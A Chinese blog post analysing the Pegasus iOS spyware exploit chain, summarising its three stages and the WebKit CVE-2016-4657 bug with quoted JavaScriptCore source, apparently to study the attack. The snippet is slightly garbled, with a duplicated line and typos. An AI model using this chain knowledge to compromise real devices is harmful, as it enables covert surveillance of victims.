<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
  <link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#222">
  <link rel="manifest" href="/images/site.webmanifest">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"finsenty54.github.io","root":"/","images":"/images","scheme":"Mist","version":"8.1.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"algolia":{"appID":"T0QIVHGFB7","apiKey":"12fa600f34612e11373aa0f7e199dde3","indexName":"my_blog","hits":{"per_page":10}}};
  </script>
<meta name="description" content="英语翻译不行啊">
<meta property="og:type" content="article">
<meta property="og:title" content="pegasus分析">
<meta property="og:url" content="http://finsenty54.github.io/2019/04/16/pegasus%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="FINSENTY54">
<meta property="og:description" content="英语翻译不行啊">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.ax1x.com/2019/04/18/ESiMgf.png">
<meta property="article:published_time" content="2019-04-16T00:54:59.000Z">
<meta property="article:modified_time" content="2020-10-31T08:53:12.112Z">
<meta property="article:author" content="finsenty54">
<meta property="article:tag" content="ios">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.ax1x.com/2019/04/18/ESiMgf.png">


<link rel="canonical" href="http://finsenty54.github.io/2019/04/16/pegasus%E5%88%86%E6%9E%90/">


<script class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>
<title>pegasus分析 | FINSENTY54</title>
  
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-135283153-1"></script>
    <script>
      if (CONFIG.hostname === location.hostname) {
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-135283153-1');
      }
    </script>



  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="FINSENTY54" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">FINSENTY54</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">几处早莺争暖树，谁家新燕啄春泥。</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">18</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">10</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">81</span></a>

  </li>
        <li class="menu-item menu-item-sitemap">

    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container"></div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container">
  <div class="algolia-stats"><hr></div>
  <div class="algolia-hits"></div>
  <div class="algolia-pagination"></div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <section class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PEGASUS%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">PEGASUS攻击分析</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%8F%82%E8%80%83-lookout-report"><span class="nav-number">1.0.0.0.0.1.</span> <span class="nav-text">参考 lookout report</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E8%BF%87%E7%A8%8B"><span class="nav-number">1.0.1.</span> <span class="nav-text">攻击过程</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%98%B6%E6%AE%B5%E4%B8%80"><span class="nav-number">1.0.1.0.1.</span> <span class="nav-text">阶段一</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%98%B6%E6%AE%B5%E4%BA%8C"><span class="nav-number">1.0.1.0.2.</span> <span class="nav-text">阶段二</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%98%B6%E6%AE%B5%E4%B8%89"><span class="nav-number">1.0.1.0.3.</span> <span class="nav-text">阶段三</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2016-4657"><span class="nav-number">1.1.</span> <span class="nav-text">CVE-2016-4657</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%83%8C%E6%99%AF"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB"><span class="nav-number">1.1.0.2.</span> <span class="nav-text">攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.1.0.2.1.</span> <span class="nav-text">设置触发漏洞</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E5%8E%9F%E8%AF%AD"><span class="nav-number">1.1.0.3.</span> <span class="nav-text">获取任意读写原语</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AF%B9%E8%B1%A1%E5%9C%B0%E5%9D%80"><span class="nav-number">1.1.0.4.</span> <span class="nav-text">获取对象地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">1.1.0.5.</span> <span class="nav-text">本地代码执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%9E%E9%81%BF%E6%A3%80%E6%B5%8B"><span class="nav-number">1.1.0.6.</span> <span class="nav-text">回避检测</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87KASLR"><span class="nav-number">1.2.</span> <span class="nav-text">绕过KASLR</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%9A%84%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5%EF%BC%9A%E5%86%85%E6%A0%B8%E4%BD%8D%E7%BD%AE%E6%B3%84%E9%9C%B2"><span class="nav-number">1.2.1.</span> <span class="nav-text">注入的第二阶段：内核位置泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90KASLR%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.2.</span> <span class="nav-text">分析KASLR绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#32%E4%BD%8D%E5%92%8C63%E4%BD%8D%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8C%85%E4%B8%8D%E5%90%8C%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">32位和63位二进制包不同的地方</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BDAPI"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">加载API</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E8%AE%BE%E7%BD%AE%E5%92%8C%E5%B9%B3%E5%8F%B0%E7%A1%AE%E5%AE%9A"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">环境设置和平台确定</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%85%A5KASLR"><span class="nav-number">1.2.2.4.</span> <span class="nav-text">攻入KASLR</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%A8%E5%8F%97%E5%AE%B3%E8%AE%BE%E5%A4%87%E4%B8%8A%E5%BB%BA%E7%AB%8B%E8%AF%BB-%E5%86%99-%E6%89%A7%E8%A1%8C%E5%8E%9F%E8%AF%AD%EF%BC%8832bit%EF%BC%89"><span class="nav-number">1.2.2.5.</span> <span class="nav-text">在受害设备上建立读&#x2F;写&#x2F;执行原语（32bit）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BA%BF%E7%A8%8B%E6%93%8D%E4%BD%9C"><span class="nav-number">1.2.2.6.</span> <span class="nav-text">线程操作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8B%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%EF%BC%8832%E4%BD%8D%EF%BC%89"><span class="nav-number">1.2.2.7.</span> <span class="nav-text">建立通信隧道（32位）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#payload%E6%9E%84%E9%80%A0%E5%92%8C%E5%86%85%E6%A0%B8%E6%8F%92%E5%85%A5"><span class="nav-number">1.2.2.8.</span> <span class="nav-text">payload构造和内核插入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#payload%E7%BB%93%E6%9E%84%E5%92%8C%E5%86%85%E6%A0%B8%E6%8F%92%E5%85%A5%EF%BC%8864%E4%BD%8D%EF%BC%89"><span class="nav-number">1.2.2.9.</span> <span class="nav-text">payload结构和内核插入（64位）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8B%E5%86%85%E6%A0%B8%E8%AF%BB-%E5%86%99%E5%9F%BA%E5%85%83%EF%BC%8832%E4%BD%8D%EF%BC%89"><span class="nav-number">1.2.2.10.</span> <span class="nav-text">建立内核读&#x2F;写基元（32位）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#payload%E7%BB%93%E6%9E%84%E5%92%8C%E5%86%85%E6%A0%B8%E6%8F%92%E5%85%A5%EF%BC%8864%E4%BD%8D%EF%BC%89-1"><span class="nav-number">1.2.2.11.</span> <span class="nav-text">payload结构和内核插入（64位）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8B%E5%86%85%E6%A0%B8%E8%AF%BB-%E5%86%99%E5%9F%BA%E5%85%83%EF%BC%8832%E4%BD%8D%EF%BC%89-1"><span class="nav-number">1.2.2.12.</span> <span class="nav-text">建立内核读&#x2F;写基元（32位）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8B%E5%86%85%E6%A0%B8%E8%AF%BB-%E5%86%99%E5%9F%BA%E5%85%83%EF%BC%8864%E4%BD%8D%EF%BC%89"><span class="nav-number">1.2.2.13.</span> <span class="nav-text">建立内核读&#x2F;写基元（64位）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8B%E5%86%85%E6%A0%B8%E6%89%A7%E8%A1%8C%E5%8E%9F%E8%AF%AD%EF%BC%8832%E4%BD%8D%EF%BC%89"><span class="nav-number">1.2.2.14.</span> <span class="nav-text">建立内核执行原语（32位）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E8%A1%A5%E5%86%85%E6%A0%B8%E4%BB%A5%E5%85%81%E8%AE%B8%E5%86%85%E6%A0%B8%E7%AB%AF%E5%8F%A3%E8%AE%BF%E9%97%AE"><span class="nav-number">1.2.2.15.</span> <span class="nav-text">修补内核以允许内核端口访问</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B6%E6%AE%B5%E4%B8%89%EF%BC%9A%E6%8F%90%E6%9D%83%E5%92%8C%E5%AE%9E%E7%8E%B0%E8%B6%8A%E7%8B%B1"><span class="nav-number">1.3.</span> <span class="nav-text">阶段三：提权和实现越狱</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E7%B3%BB%E7%BB%9F%E4%BB%A5%E6%8F%90%E6%9D%83"><span class="nav-number">1.3.1.</span> <span class="nav-text">修改系统以提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A6%81%E7%94%A8%E4%BB%A3%E7%A0%81%E7%AD%BE%E5%90%8D"><span class="nav-number">1.3.2.</span> <span class="nav-text">禁用代码签名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85%E9%A9%B1%E5%8A%A8%E5%99%A8"><span class="nav-number">1.3.3.</span> <span class="nav-text">重新安装驱动器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B8%85%E7%90%86"><span class="nav-number">1.3.4.</span> <span class="nav-text">清理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8B%E4%B8%80%E9%98%B6%E6%AE%B5%E5%AE%89%E8%A3%85"><span class="nav-number">1.3.5.</span> <span class="nav-text">下一阶段安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%B0%E6%9C%89%E7%9A%84%E8%B6%8A%E7%8B%B1%E6%A3%80%E6%B5%8B"><span class="nav-number">1.3.6.</span> <span class="nav-text">现有的越狱检测</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%EF%BC%9APegasus%E6%8C%81%E4%B9%85%E6%80%A7%E6%9C%BA%E5%88%B6"><span class="nav-number">1.4.</span> <span class="nav-text">四：Pegasus持久性机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Pegasus%E6%8C%81%E4%B9%85%E6%80%A7%E6%9C%BA%E5%88%B6"><span class="nav-number">1.4.1.</span> <span class="nav-text">Pegasus持久性机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JavaScriptCore%E5%86%85%E5%AD%98%E6%8D%9F%E5%9D%8F%E9%97%AE%E9%A2%98"><span class="nav-number">1.4.2.</span> <span class="nav-text">JavaScriptCore内存损坏问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-1"><span class="nav-number">1.4.3.</span> <span class="nav-text">攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E4%BB%BB%E6%84%8F%E8%AF%BB-%E5%86%99%E5%8E%9F%E8%AF%AD"><span class="nav-number">1.4.3.1.</span> <span class="nav-text">获取任意读&#x2F;写原语</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%84%E6%BC%8F%E5%AF%B9%E8%B1%A1%E5%9C%B0%E5%9D%80"><span class="nav-number">1.4.3.2.</span> <span class="nav-text">泄漏对象地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AA%E7%AD%BE%E5%90%8D%E7%9A%84%E6%9C%AC%E6%9C%BA%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">1.4.3.3.</span> <span class="nav-text">未签名的本机代码执行</span></a></li></ol></li></ol></li></ol></li></ol></div>
        </section>
        <!--/noindex-->

        <section class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="finsenty54"
      src="https://media.giphy.com/media/5xtDarHBDofiI04yE4U/giphy.gif">
  <p class="site-author-name" itemprop="name">finsenty54</p>
  <div class="site-description" itemprop="description">blog</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">81</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">10</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">18</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/Finsenty54" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Finsenty54" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:fin12138@gmail.com" title="E-Mail → mailto:fin12138@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license site-overview-item animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



        </section>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/Finsenty54" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://finsenty54.github.io/2019/04/16/pegasus%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://media.giphy.com/media/5xtDarHBDofiI04yE4U/giphy.gif">
      <meta itemprop="name" content="finsenty54">
      <meta itemprop="description" content="blog">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="FINSENTY54">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          pegasus分析
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2019-04-16 08:54:59" itemprop="dateCreated datePublished" datetime="2019-04-16T08:54:59+08:00">2019-04-16</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-10-31 16:53:12" itemprop="dateModified" datetime="2020-10-31T16:53:12+08:00">2020-10-31</time>
      </span>

  
    <span id="/2019/04/16/pegasus%E5%88%86%E6%9E%90/" class="post-meta-item leancloud_visitors" data-flag-title="pegasus分析" title="阅读次数">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span class="leancloud-visitors-count"></span>
    </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2019/04/16/pegasus%E5%88%86%E6%9E%90/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2019/04/16/pegasus%E5%88%86%E6%9E%90/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>38k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>35 分钟</span>
    </span>
</div>

            <div class="post-description">英语翻译不行啊</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="PEGASUS攻击分析"><a href="#PEGASUS攻击分析" class="headerlink" title="PEGASUS攻击分析"></a>PEGASUS攻击分析</h1><h6 id="参考-lookout-report"><a href="#参考-lookout-report" class="headerlink" title="参考 lookout report"></a>参考 <a target="_blank" rel="noopener" href="https://info.lookout.com/rs/051-ESQ-475/images/pegasus-exploits-technical-details.pdf" title="lookout report">lookout report</a></h6><h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><p>受害者点击链接之后，攻击者展开攻击。攻击分为三个阶段，每个阶段都包含了攻击模块代码和隐蔽软件。攻击是线性的，每个阶段都依赖于上个阶段的代码、隐蔽软件的成功，每个阶段都使用了关键的0day漏洞，以确保进攻成功进行。</p>
<h5 id="阶段一"><a href="#阶段一" class="headerlink" title="阶段一"></a>阶段一</h5><p>传送并利用WebKit漏洞，通过HTML文件利用WebKit中的CVE-2016-4657漏洞。</p>
<h5 id="阶段二"><a href="#阶段二" class="headerlink" title="阶段二"></a>阶段二</h5><p>越狱。在第一阶段中会根据设备（32/64位）下载相应的，经过加密混淆的包。每次下载的包都是用独一无二的key加密的。软件包内包含针对iOS内核两个漏洞(CVE-2016-4655和CVE-2016-4656)的exp还有一个用来下载解密第三阶段软件包的loader。</p>
<a id="more"></a>

<h5 id="阶段三"><a href="#阶段三" class="headerlink" title="阶段三"></a>阶段三</h5><p>安装间谍软件。经过了第二阶段的越狱，第三阶段中，攻击者会选择需要监听的软件，把hook安装到应用中。另外，第三阶段还会检查设备之前有没有通过其他方式越狱过，如果有，则会移除之前越狱后开放的系统访问权限，如ssh。软件还有一个“故障保险“，如果检测到设备满足某些条件，软件就会自毁。</p>
<p>第三阶段中，间谍会部署一个test222.tar文件，这是一个tar包，包中包含各种实现各种目的的文件，如实现中间人攻击的根TLS证书、针对Viber、Whatsapp的嗅探库、专门用于通话录音的库等。</p>
<h2 id="CVE-2016-4657"><a href="#CVE-2016-4657" class="headerlink" title="CVE-2016-4657"></a>CVE-2016-4657</h2><p>第一阶段用到了<strong>WebKit’s JavaScriptCore library</strong> 中的漏洞<strong>CVE-2016-4657</strong>。让Safari运行一段JavaScript payload，以此来获得Safari WebContent进程的代码执行权。</p>
<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>MarkedArgumentBuffer中的<strong>slowAppend()**函数中存在这个漏洞，并且可以在静态方法</strong>definePropertries()**中使用MarkedArgumentBuffer来利用这个漏洞。definePropertries()接受一个对象，这个对象的可枚举变量构成要在另一个目标对象上定义或修改的属性的描述符。算法链接这些变量和目标对象，基于变量列表进行两次迭代。在第一个部分，检查每个变量的格式，并创建一个有默认值的PropertyDescriptor对象。<br> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">size_t numProperties = propertyName.size();</span><br><span class="line">Vector&lt;PropertyDescriptor&gt; descriptors;</span><br><span class="line">size_t numProperties = propertyName.size();</span><br><span class="line">Vector&lt;PropertyDescriptor&gt; descriptors;</span><br><span class="line">MarkedArgumentBuffer markBuffer;</span><br><span class="line"><span class="function"><span class="title">for</span>(<span class="params">size_t i =<span class="number">0</span>;i&lt;numProperties;i++</span>)</span>&#123;</span><br><span class="line">	JSValue prop = properties-&gt;get(exec,propertyNames[i]);</span><br><span class="line">	<span class="keyword">if</span>(exec-&gt;hadException())</span><br><span class="line">		<span class="keyword">return</span> jsNull();</span><br><span class="line">	PropertyDescriptor descriptor;</span><br><span class="line">	<span class="keyword">if</span>(!toPropertyDescriptor(exec, prop,descriptor))</span><br><span class="line">		<span class="keyword">return</span> jsNull();</span><br><span class="line">	descriptors.append(descriptor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>如果每一个变量都是有效的，那么第二部分就会执行。这个部分将用户提供的属性变量与目标对象结合在一起，通过defineOwnProperty()实现。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">for</span>(<span class="params">size_t i=<span class="number">0</span>;i&lt;numProperties; i++</span>)</span>&#123;</span><br><span class="line">	Identifier propertyName = propertyNames[i];</span><br><span class="line">	<span class="keyword">if</span>(exec-&gt;propertyName().isPrivateName(properName))</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	</span><br><span class="line">	object-&gt;methodTable(exec-&gt;vm())-&gt;defineOwnProperty(object, exec, propertyName,descriptors[i],<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
